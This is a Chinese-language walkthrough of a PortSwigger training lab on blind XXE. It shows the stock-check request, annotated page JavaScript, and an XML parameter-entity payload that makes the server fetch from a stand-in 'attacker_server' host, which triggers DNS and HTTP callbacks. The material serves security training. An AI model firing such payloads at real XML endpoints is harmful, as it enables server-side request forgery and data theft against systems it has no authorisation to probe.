# 实验：通过 XML 参数实体实现带外交互的盲注 XXE

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

本实验包含一个“检查库存”（Check stock）功能，该功能会解析 XML 输入，但不显示任何未预期的值，并且会阻止包含常规外部实体的请求。

为了解决本实验，请使用参数实体使 XML 解析器向 Burp Collaborator 发起 DNS 查询和 HTTP 请求。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

## 步骤

探测
- 使用库存检索功能
    ```http
    POST /product/stock HTTP/2

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
        1
        </productId>
        <storeId>
        1
        </storeId>
    </stockCheck>
    ```
    - 使用 XML 格式

    - 服务器响应
        ```http
        Content-Type: text/plain; charset=utf-8

        938
        ```

测试
- 使用带外载荷
    ```xml
    <!DOCTYPE example [
        <!ENTITY % test SYSTEM "http://attacker_server:80/xxe_test.txt">
        %test;  
    ]>
    ```
    - 服务器响应 `"XML parsing error"`，同时带外服务器收到 DNS 与 HTTP 连接请求

库存查看功能 JS 代码
- `xmlStockCheckPayload.js`

    ```js
    window.contentType = 'application/xml';

    function payload(data) {
        // 设置头部
        var xml = '<?xml version="1.0" encoding="UTF-8"?>';
        // 设置根标签
        xml += '<stockCheck>';
        // 遍历列表的 名/值 => 标签/内容
        for (var pair of data.entries()) {
            var key = pair[0];
            var value = pair[1];

            xml += '<' + key + '>' + value + '</' + key + '>';
        }

        xml += '</stockCheck>';
        return xml;
    }
    ```
    - 将数据设置为 XML 格式


- `stockCheck.js`

    ```js
    // 提交库存表单时修改默认行为到 JS 函数调用
    document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
        checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });

    function checkStock(method, path, data) {
        // 重试3次连接
        const retry = (tries) => tries == 0 ?
            null :
            // 调用 payload 构建 XML 格式后发送
            fetch(
                path, {
                    method,
                    headers: {
                        'Content-Type': window.contentType
                    },
                    body: payload(data)
                }
            )
            // 若查询成功则设置回显字符串，否则显示查询失败
            .then(res => res.status === 200 ?
                res.text().then(t => isNaN(t) ? t : t + " units") :
                "Could not fetch stock levels!"      
            )
            // 将查询字符串使用 innerHTML 插入到页面
            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
            .catch(e => retry(tries - 1));

        retry(3);
    }
    ```
